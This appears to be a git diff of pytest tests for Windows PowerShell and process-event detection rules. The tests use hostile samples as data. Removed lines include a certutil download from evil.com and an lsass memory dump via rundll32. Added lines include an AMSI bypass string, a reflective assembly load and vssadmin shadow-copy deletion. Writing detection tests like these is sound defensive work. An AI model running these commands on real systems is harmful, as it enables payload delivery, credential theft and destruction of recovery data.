@@ -1,6 +1,14 @@
-from detector.rules import detect_credential_prompt
-from detector.rules import detect_suspicious_process
+from detector.rules import (
+    detect_credential_prompt,
+    detect_amsi_and_logging_bypass,
+    detect_in_memory_execution,
+    detect_suspicious_process,
+    detect_system_recovery_tampering,
+    detect_suspicious_parent
+)
 
+
+# --- Event ID 4104 Tests ---
 
 def test_credential_detection():
     script = """
@@ -13,36 +21,8 @@ def test_credential_detection():
 
     assert result["detected"] is True
     assert result["severity"] == "HIGH"
-    assert result["indicator_count"] == 3
+    assert len(result["indicators"]) == 3
 
-
-def test_credential_benign():
-    script = """
-    Write-Host "Hello World"
-    """
-
-    result = detect_credential_prompt(script)
-
-    assert result["detected"] is False
-
-
-def test_encoded_powershell():
-    result = detect_suspicious_process(
-        "powershell.exe -nop -enc ABC123",
-        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-    )
-
-    assert result["detected"] is True
-    assert "command:-enc" in result["indicators"]
-
-
-def test_normal_powershell():
-    result = detect_suspicious_process(
-        "powershell.exe Get-Process",
-        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-    )
-
-    assert result["detected"] is False
 
 def test_credential_partial_matches():
     script_one = "PromptForCredential"
@@ -53,41 +33,83 @@ def test_credential_partial_matches():
 
     assert res_low["detected"] is True
     assert res_low["severity"] == "LOW"
-    assert "PromptForCredential" in res_low["indicators"]
+    assert "credential_prompt:promptforcredential" in res_low["indicators"]
 
     assert res_med["detected"] is True
     assert res_med["severity"] == "MEDIUM"
-    assert len(res_med["indicators"]) == 2
 
 
-def test_lolbin_certutil_download():
-    result = detect_suspicious_process(
-        "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
-        "C:\\Windows\\System32\\certutil.exe"
-    )
-
-    assert result["detected"] is True
-    assert result["severity"] == "HIGH"  # Updated from MEDIUM to HIGH
-    assert "process:certutil.exe" in result["indicators"]
-    assert "command:urlcache" in result["indicators"]
-    assert "command:http://" in result["indicators"]
-
-def test_rundll32_memory_dump():
-    result = detect_suspicious_process(
-        "rundll32.exe comsvcs.dll, MiniDump 672 C:\\temp\\lsass.dmp full",
-        "C:\\Windows\\System32\\rundll32.exe"
-    )
+def test_amsi_bypass_detection():
+    script = "sYsTeM.mAnAgEmEnT.aUtOmAtIoN.aMsIUtils.GetField('amsiInitFailed')"
+    result = detect_amsi_and_logging_bypass(script)
 
     assert result["detected"] is True
     assert result["severity"] == "HIGH"
-    assert "memory_dump_behavior" in result["indicators"]
+    assert any("amsi_bypass" in ind for ind in result["indicators"])
 
 
-def test_suspicious_path_execution():
-    result = detect_suspicious_process(
-        "C:\\Users\\Public\\script.ps1",
-        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-    )
+def test_in_memory_execution_detection():
+    script = "[Reflection.Assembly]::Load([System.Convert]::FromBase64String('...'))"
+    result = detect_in_memory_execution(script)
 
     assert result["detected"] is True
-    assert "path:\\users\\public\\" in result["indicators"]
+    assert result["severity"] == "HIGH"
+    assert "in_memory_execution:[reflection.assembly]::load" in result["indicators"]
+
+
+# --- Event ID 1 Tests ---
+
+def test_suspicious_process_detection():
+    cmd = "powershell.exe -nop -enc AAAA..."
+    image = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+
+    result = detect_suspicious_process(cmd, image)
+
+    assert result["detected"] is True
+    assert "process:powershell.exe" in result["indicators"]
+
+
+def test_recovery_tampering_detection():
+    cmd = "vssadmin.exe Delete Shadows /All /Quiet"
+    image = "C:\\Windows\\System32\\vssadmin.exe"
+
+    result = detect_system_recovery_tampering(cmd, image)
+
+    assert result["detected"] is True
+    assert result["severity"] == "HIGH"
+    assert "vssadmin_shadow_deletion" in result["indicators"]
+
+
+def test_suspicious_parent_detection():
+    parent = "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE"
+    child = "C:\\Windows\\System32\\cmd.exe"
+
+    result = detect_suspicious_parent(parent, child)
+
+    assert result["detected"] is True
+    assert result["severity"] == "HIGH"
+    assert "parent:winword.exe" in result["indicators"]
+    assert "child_spawned:cmd.exe" in result["indicators"]
+
+
+# --- Benign Telemetry Tests ---
+
+def test_benign_script():
+    script = "Write-Output 'Hello World'"
+
+    res_cred = detect_credential_prompt(script)
+    res_amsi = detect_amsi_and_logging_bypass(script)
+    res_mem = detect_in_memory_execution(script)
+
+    assert res_cred["detected"] is False
+    assert res_amsi["detected"] is False
+    assert res_mem["detected"] is False
+
+
+def test_benign_process():
+    cmd = "C:\\Windows\\System32\\notepad.exe C:\\Users\\user\\document.txt"
+    image = "C:\\Windows\\System32\\notepad.exe"
+
+    result = detect_suspicious_process(cmd, image)
+
+    assert result["detected"] is False
